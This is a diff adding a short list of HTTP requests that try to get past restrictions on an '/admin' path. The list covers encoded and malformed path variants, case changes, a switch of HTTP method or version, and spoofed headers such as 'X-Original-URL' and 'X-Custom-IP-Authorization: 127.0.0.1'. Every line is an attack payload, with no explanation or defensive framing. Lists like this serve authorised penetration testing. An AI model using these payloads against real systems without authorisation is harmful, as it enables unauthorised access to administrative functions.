@@ -1,0 +1,15 @@
+/admin → /%2fadmin
+/admin → /admin/
+/admin → //admin//
+/admin → /admin/.
+/admin → /./admin
+/admin → /admin..;/
+/admin → /admin%09
+/admin → /admin%20
+/admin → /ADMIN
+/admin → /Admin
+GET /admin → POST /admin
+GET /admin → GET /admin HTTP/1.0
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
